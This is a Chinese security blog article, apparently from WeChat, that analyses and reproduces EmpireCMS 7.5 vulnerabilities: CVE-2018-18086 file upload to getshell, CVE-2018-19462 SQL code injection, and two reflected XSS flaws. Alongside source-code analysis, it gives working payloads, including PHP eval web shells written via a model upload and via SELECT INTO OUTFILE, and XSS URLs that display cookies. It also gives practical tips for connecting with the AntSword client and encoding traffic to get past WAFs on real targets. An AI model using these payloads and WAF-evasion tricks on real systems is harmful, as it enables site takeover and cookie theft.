> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MY__BqmTsWzFP6Pg6bKDrw)

前言
==

本文将对 EmpireCMS(帝国 cms) 的漏洞进行分析及复现。代码分析这一块主要还是借鉴了大佬们的一些分析思想，这里对大佬们提供的思路表示衷心的感谢。

环境搭建
====

帝国 cms 的默认安装路径为 http://localhost/e/install，进入安装一直往下

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOVIRo13sER2Fo0LEJgbjExIVOsh3JYWd42U3GskkIo6AicXYQO56tmxg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzO8bZrTU746sgyZ4xb1lp0fFokGVZ7Iibbd4w4D3WJBfroh60iamZulvvQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOMsWzcyVticHhDfuvHY5kJSG9EujVMRlibictv9KEwjtTGiblCw4lN0NibhA/640?wx_fmt=png)

到连接数据库这一步，mysql 版本可以选择自动识别，也可以自己选择相应版本，这里数据库如果在本地就填写 localhost（127.0.0.1）。

这里也可以选择远程连接 vps 的服务器，但是前提是 vps 上的数据库开启了远程连接

首先找到`/etc/mysql/my.conf`

找到 bind-address = 127.0.0.1 这一行注释掉（此处没有也可以忽略）

然后新建一个 admin 用户允许远程登录并立即应用配置即可

```
grant all on *.* to admin@'%' identified by '123456' with grant option;flush privileges;
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOWIgyibbsT7lQDDSk2vZ2WN6HqiafPHFoyhCtAaR0KuzWGMKjbgXMkvzA/640?wx_fmt=png)

点击下一步就会自动在数据库生成一个 empirecms 的数据库并在其中建立许多个表

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOvEWicb6ficzIIC2PJdmq5GazMhWJGIlJBMqVmghu8wTnlbh0H4nE6o9g/640?wx_fmt=png)

然后再设置进入后台管理员的密码

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzO7LCicafTGhrbnJCyiaBtG66icQopr7q4fvrOyQSQLjakyXSCANaAvnT6A/640?wx_fmt=png)

下一步即可安装完成，这里提示要删除路径避免被再次安装，但是这个地方其实设置了两层保护，即使你访问 install 这个路径会有一个. off 文件在路径下，需要将这个. off 文件删除后才能再次安装

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOoFAia7SZGPI8aib5vbs6272qloEpJTrgyP61vKegXwyBPAc0E4YSicn5Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOHc91rZ4GO7VYlAr22U2yQx8z112CckIsialSWPqBtFc92fEicFBLPqzQ/640?wx_fmt=png)

输入设置的后台管理员用户名和密码即可进入管理员后台

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOh3iaHPUXT8tTI8ckfAGds5zFxptia0icAwk1G0dy5FzngJJ9UuUCgBW3w/640?wx_fmt=png)

漏洞原理及复现
=======

后台 getshell(CVE-2018-18086)
---------------------------

### 漏洞原理

EmpireCMS 7.5 版本及之前版本在后台备份数据库时, 未对数据库表名做验证, 通过修改数据库表名可以实现任意代码执行。

EmpireCMS7.5 版本中的 / e/class/moddofun.php 文件的”LoadInMod” 函数存在安全漏洞, 攻击者可利用该漏洞上传任意文件。

### 源码分析

主要漏洞代码位置

// 导入模型

```
//导入模型elseif($enews=="LoadInMod"){    $file=$_FILES['file']['tmp_name'];    $file_name=$_FILES['file']['name'];    $file_type=$_FILES['file']['type'];    $file_size=$_FILES['file']['size'];    LoadInMod($_POST,$file,$file_name,$file_type,$file_size,$logininid,$loginin);}
```

转到 LoadInMod 定义

在 localhost/EmpireCMS/e/class/moddofun.php 找到上传文件的定义

```
//上传文件    $path=ECMS_PATH."e/data/tmp/mod/uploadm".time().make_password(10).".php";    $cp=@move_uploaded_file($file,$path);    if(!$cp)    {        printerror("EmptyLoadInMod","");    }    DoChmodFile($path);    @include($path);    UpdateTbDefMod($tid,$tbname,$mid);
```

文件包含

上传文件处使用 time().makepassword(10) 进行加密文件名

```
//取得随机数function make_password($pw_length){    $low_ascii_bound=48;    $upper_ascii_bound=122;    $notuse=array(58,59,60,61,62,63,64,91,92,93,94,95,96);    while($i<$pw_length)    {        if(PHP_VERSION<'4.2.0')        {            mt_srand((double)microtime()*1000000);        }        mt_srand();        $randnum=mt_rand($low_ascii_bound,$upper_ascii_bound);        if(!in_array($randnum,$notuse))        {            $password1=$password1.chr($randnum);            $i++;        }    }    return $password1;}
```

下方代码 @include($path) 直接包含文件，因此可以通过添加创建文件的代码绕过。

### 漏洞复现

来到导入系统模型的页面

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOeudiasvEiau1Ovx2KnWyybJnBgZRibbveTib87ckvJISljrcsklTWDIcvg/640?wx_fmt=png)

本地准备一个 1.php 并改名为 1.php.mod，注意这里需要用 \$ 进行转义，存放的数据表名需要填一个数据库内没有的表名，点击上传

```
<?php file_put_contents("getshell.php","<?php @eval(\$_POST[cmd]); ?>");?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOn3CkZhFPW4vm1UiciaL88mlzfgeuiaDFk8cgnSI4RNpbbjHKrxkmDzrzg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzObo8Xviay6Uh5iaIR06YM83s14WpQw13diaLicv3lS7B9vFicQU7k4t67W4A/640?wx_fmt=png)

导入成功后访问一下生成 shell 看能不能访问得到，没有报错是可以访问到的，那么证明已经上传成功了

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzO7LCicafTGhrbnJCyiaBtG66icQopr7q4fvrOyQSQLjakyXSCANaAvnT6A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOHiaKqkPLklZia5qZUue7OSpV2fIkdBHgyxiaZ3vIytKJv4fk7ukoRy2EQ/640?wx_fmt=png)

再用蚁剑连接即可

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOGiaSkC1v0MjUfmDtYhibRBIjw6ibwq7IRQuaWwls8bzZJLETia6uns621g/640?wx_fmt=png)

### 几个实战中遇到的坑

1. 有 waf 报错 500

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOj73K4ZXGuaib885wBUl1ic95kB3fQcgXPUdsOnJ2xstdeMMJazRkWg8A/640?wx_fmt=png)

500 很容易联想到禁止 web 流量，那么我们上传的一句话木马默认情况下是不进行加密的，所以很容易被 waf 识别并拦截。

解决方法：使用蚁剑自带的 base64 编码器和解密器即可成功上线，这里也可以用自己的编码器和解密器绕过 waf 拦截

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOmX98SUlUe9TCPUZa2d0lqoZJsnU62QYxZr9CXYVXeWfZTEIkuHCdZA/640?wx_fmt=png)

2. 不能使用冰蝎、哥斯拉马

因为要在 $ 之前加 \ 转义，冰蝎转义后的 php.mod 应该如下图所示

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOZHAHLHKcT8aoAoBD0ELWQ0u4s4ppLJxzCIvKZq3YT2gibMYIiaR6gORw/640?wx_fmt=png)

上传到模型处就无回显

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOniaGAprpg2247hy0ic3cU4hNRRjlHdA3G1eic2d4OoW18R4th5vlYA0Rg/640?wx_fmt=png)

### 实战小技巧

如果有 waf 拦截 web 流量就走加密传输，如果始终连接不上就要一步步的进行排查。这里可以在一句话密码后面输出一个 echo 123，通过是否有回显来探测哪一步没有完善导致连接不成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOEDtoIvwgW1cXnCgbFyvVX4tzhF3poHicmibLjENLMs6ZrxJhEbtdW3fA/640?wx_fmt=png)

代码注入 (CVE-2018-19462)
---------------------

### 漏洞原理

EmpireCMS7.5 及之前版本中的 admindbDoSql.php 文件存在代码注入漏洞。

该漏洞源于外部输入数据构造代码段的过程中，网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。

主要漏洞代码位置

执行 sql 语句处

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzO3dSOkKVGYKqJzmF5uw4ibABC3G2RzDCy662tzkx5cTUzuibamCD4zm8A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzO77hcR4tfdicrZB9ibT7WkV3TxxF3bZpNzJ7hMgksiayLWxJWnOvNJRiaLw/640?wx_fmt=png)

分析源码定位漏洞出现的位置在 localhost/EmpireCMS/e/admin/db/DoSql.php，对 sqltext 进行 RepSqlTbpre 函数处理

```
//运行SQL语句function ExecSql($id,$userid,$username){    global $empire,$dbtbpre;    $id=(int)$id;    if(empty($id))    {        printerror('EmptyExecSqlid','');    }    $r=$empire->fetch1("select sqltext from {$dbtbpre}enewssql where id='$id'");    if(!$r['sqltext'])    {        printerror('EmptyExecSqlid','');    }    $query=RepSqlTbpre($r['sqltext']);    DoRunQuery($query);    //操作日志    insert_dolog("query=".$query);    printerror("DoExecSqlSuccess","ListSql.php".hReturnEcmsHashStrHref2(1));}
```

转到定义 RepSqlTbpre，发现只对表的前缀做了替换

```
//替换表前缀function RepSqlTbpre($sql){    global $dbtbpre;    $sql=str_replace('[!db.pre!]',$dbtbpre,$sql);    return $sql;}
```

转到定义 DoRunQuery，对 $query 进行处理。

对 $sql 参数只做了去除空格、以; 分隔然后遍历, 没有做别的限制和过滤, 导致可以执行恶意的 sql 语句

```
//运行SQLfunction DoRunQuery($sql){    global $empire;    $sql=str_replace("\r","\n",$sql);    $ret=array();    $num=0;    foreach(explode(";\n",trim($sql)) as $query)    {        $queries=explode("\n",trim($query));        foreach($queries as $query)        {            $ret[$num].=$query[0]=='#'||$query[0].$query[1]=='--'?'':$query;        }        $num++;    }    unset($sql);    foreach($ret as $query)    {        $query=trim($query);        if($query)        {            $empire->query($query);        }    }}
```

### payload

用 select ... into outfile 语句写入 php 一句话木马，但是这里需要知道存放的绝对路径，这里可以使用一个 phpinfo() 用第一种方法传上去

```
<?php file_put_contents("getshell.php","<?php phpinfo();?>");?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOiaTdEaIiaHkFq2UJ3GWK84F1PcItdA3SLe0QgSYfeWOao8FeYXFibqCjw/640?wx_fmt=png)

访问即可打出 phpinfo

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOfFoBzcPFsD4vcMhEDicfNVqt0Ylw7oqgMBibVOke8CQGhtoWmom6sXjA/640?wx_fmt=png)

这里只是找到了 php 的绝对路径，还不是 web 所存储的路径，这时候查看源代码搜索 DOCUMENT_ROOT 查询网站所处的绝对路径

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOhHmfhu6QmH8ic3KWV2s9K7fO0icwyXOIaUMZByhB0adwZfs9NBSfAf1g/640?wx_fmt=png)

用 select ... into outfile 语句写入 php 一句话木马

```
select '<?php @eval($_POST[LEOGG])?>' into outfile 'C:/phpStudy/PHPTutorial/WWW/EmpireCMS/e/admin/Get.php'
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOAdmLa6Acc5jdibTWperf6ia3iawLia2stQGicl1gLusrKuawSE4Td7GzjVA/640?wx_fmt=png)

看到上传已经成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOTtqfqVnlP7oJXSn4RkezWibeWONicnkRNnp8eAKI8giaMofvAZXhHs5FA/640?wx_fmt=png)

访问一下是存在的

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOQmvqLZa9A7yLReialSO8eotxGzD77WB9vJHzmbb9X9TL9MXKKYSVFPg/640?wx_fmt=png)

直接上蚁剑连接即可

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOnPwblP1NrJss1YOVsDeC6OqHIudwR8ib0iaficic3ibq7bsCmBxAoibic0iccQ/640?wx_fmt=png)

### 实战中的一些坑

我们知道 secure_file_priv 这个参数在 mysql 的配置文件里起到的是能否写入的作用，当 secure_file_priv = 为空，则可以写入 sql 语句到数据库，当 secure_file_priv = NULL，则不可以往数据库里写 sql 语句，当 secure_file_priv = /xxx，一个指定目录的时候，就只能往这个指定的目录里面写东西

这个地方很明显报错就是限制数据库的导入跟导出，这里很明显判断 secure_file_priv = NULL，所以当实战中出现在这种情况下是不能够用这种方法的

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOzcmRhzRTXyNbL04urqicY4W81ZI5c2bK8eKDjyJtGYFtyMiaz5MK01VQ/640?wx_fmt=png)

如果在本地可以修改或添加 secure_file_priv = 这一行语句

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOXUsibZk8siccyyG6IeYXT40nQ5D3hkvwRhsw3Wsh0huwqeJVCzAkctxg/640?wx_fmt=png)

后台 xss
------

### 原理分析

漏洞类型：反射型 xss

漏洞文件：localhost/EmpireCMS/e/admin/openpage/AdminPage.php

漏洞原理：该漏洞是由于代码只使用 htmlspecialchars 进行实体编码过滤，而且参数用的是 ENT_QUOTES(编码双引号和单引号), 还有 addslashes 函数处理，但是没有对任何恶意关键字进行过滤，从而导致攻击者使用别的关键字进行攻击

源码分析

主要漏洞代码位置 localhost/EmpireCMS/e/admin/openpage/AdminPage.php

```
$leftfile=hRepPostStr($_GET['leftfile'],1);$mainfile=hRepPostStr($_GET['mainfile'],1);
```

利用 hRepPostStr 函数进行过滤，跳转到该函数的定义如下

```
function hRepPostStr($val,$ecms=0,$phck=0){    if($phck==1)    {        CkPostStrCharYh($val);    }    if($ecms==1)    {        $val=ehtmlspecialchars($val,ENT_QUOTES);    }    CkPostStrChar($val);    $val=AddAddsData($val);    return $val;}
```

用 ehtmlspecialchars 函数进行 HTML 实体编码过滤，其中 ENT_QUOTES - 编码双引号和单引号。

```
function ehtmlspecialchars($val,$flags=ENT_COMPAT){    global $ecms_config;    if(PHP_VERSION>='5.4.0')    {        if($ecms_config['sets']['pagechar']=='utf-8')        {            $char='UTF-8';        }        else        {            $char='ISO-8859-1';        }        $val=htmlspecialchars($val,$flags,$char);    }    else    {        $val=htmlspecialchars($val,$flags);    }    return $val;}
```

要利用 htmlspecialchars 函数把字符转换为 HTML 实体

用 CkPostStrChar 函数对参数进行处理

```
function CkPostStrChar($val){    if(substr($val,-1)=="\\")    {        exit();    }}
```

获取字符末端第一个开始的字符串为 \\，则退出函数

用 AddAddsData 函数对参数进行处理

```
function AddAddsData($data){    if(!MAGIC_QUOTES_GPC)    {        $data=addslashes($data);    }    return $data;}
```

如果没有开启 MAGIC_QUOTES_GPC，则利用 addslashes 函数进行转义

addslashes() 函数返回在预定义字符之前添加反斜杠的字符串

网页输出

然而输出的位置是在 iframe 标签的 src 里，这意味着之前的过滤都没有什么用。iframe 标签可以执行 js 代码，因此可以利用 javascript:alert(/xss/) 触发 xss

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOHa1l3BAcqKcyU0wMeUuic8AaMFksKTf7QaZVbEDB4p0bgXXooicR9kwQ/640?wx_fmt=png)

### payload

payload 如下：

```
192.168.10.3/EmpireCMS/e/admin/openpage/AdminPage.php?ehash_3ZvP9=dQ7ordM5PCqKDgSmvkDf&mainfile=javascript:alert(/xss/)
```

其中 ehash 是随机生成的，在登录时可以看到 ehash_3ZvP9=dQ7ordM5PCqKDgSmvkDf，如果缺少这个 hash 值，则会提示非法来源

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOftC2ia7hmGZk282Ww6tqUibZvjW4P1Efe8AxIaeiaVeNstLY8qrunoBHg/640?wx_fmt=png)

获取 cookie 信息 payload

```
192.168.10.3/EmpireCMS/e/admin/openpage/AdminPage.php?ehash_3ZvP9=dQ7ordM5PCqKDgSmvkDf&mainfile=javascript:alert(document.cookie)
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOPl9SOE5LSG5iafzlzTrLX91TsJaT7trqTyLCodPz6gxWGtaUc3L2ZEw/640?wx_fmt=png)

前台 xss
------

### 原理分析

漏洞类型：反射型 xss

漏洞文件：localhost/EmpireCMS/e/ViewImg/index.html

漏洞原理：url 地址经过 Request 函数处理之后, 把 url 地址中的参数和值部分直接拼接当作 a 标签的 href 属性的值和 img 标签的 src 标签的值

主要漏洞代码位置 localhost/upload/e/ViewImg/index.html

```
if(Request("url")!=0){    document.write("<a title=\"点击观看完整的图片...\" href=\""+Request("url")+"\" target=\"_blank\"><img src=\""+Request("url")+"\" border=0 class=\"picborder\" onmousewheel=\"return bbimg(this)\" onload=\"if(this.width>screen.width-500)this.style.width=screen.width-500;\">");    }
```

通过 Request 函数获取地址栏的 url 参数, 并作为 img 和 a 标签的 src 属性和 href 属性, 然后经过 document.write 输出到页面。

转到 request 函数定义

```
function Request(sName){  /*   get last loc. of ?   right: find first loc. of sName   +2   retrieve value before next &    */    var sURL = new String(window.location);  var iQMark= sURL.lastIndexOf('?');  var iLensName=sName.length;    //retrieve loc. of sName  var iStart = sURL.indexOf('?' + sName +'=') //limitation 1  if (iStart==-1)        {//not found at start        iStart = sURL.indexOf('&' + sName +'=')//limitation 1        if (iStart==-1)           {//not found at end            return 0; //not found           }           }          iStart = iStart + + iLensName + 2;  var iTemp= sURL.indexOf('&',iStart); //next pair start  if (iTemp ==-1)        {//EOF        iTemp=sURL.length;        }    return sURL.slice(iStart,iTemp ) ;  sURL=null;//destroy String}
```

通过 window.location 获取当前 url 地址, 根据传入的 url 参数, 获取当前参数的起始位置和结束位置

### payload

url 地址经过 Request 函数处理之后, 然后把 url 地址中的参数和值部分直接拼接当作 a 标签的 href 属性的值和 img 标签的 src 标签的值

payload 如下：

```
http://localhost/upload/e/ViewImg/index.html?url=javascript:alert(document.cookie)
```

payload 解析：

当浏览器载入一个 Javascript URL 时，它会执行 URL 中所包含的 Javascript 代码，并且使用最后一个 Javascript 语句或表达式的值，转换为一个字符串，作为新载入的文档的内容显示。

javascript: 伪协议可以和 HTML 属性一起使用，该属性的值也应该是一个 URL。一个超链接的 href 属性就满足这种条件。当用户点击一个这样的链接，指定的 Javascript 代码就会执行。在这种情况下，Javascript URL 本质上是一个 onclick 事件句柄的替代。

点击图片触发 xss

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOhx2oUB2L6iaa8EDznZbrYnJibAv9RSfL2TvHIfBhgFKwqzM5n09fDyJw/640?wx_fmt=png)

得到网页 cookie

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOPG8jq114K0L0AqUGJPUvzGKluVNpewPIhyov0w0c93KqG4Qvf1OjNw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读：**

本月报名可以参加抽奖送 Kali NetHunter 手机的优惠活动  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247497897&idx=1&sn=5801b91d451b4c253eb3e2c5ff220673&chksm=ec1cad96db6b2480ce0be49a377819558c06b29603b812512b7cb52ca0c123bc444764f11502&scene=21#wechat_redirect)

**点赞，转发，在看**

原创投稿作者：ckin

未经授权，禁止转载

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)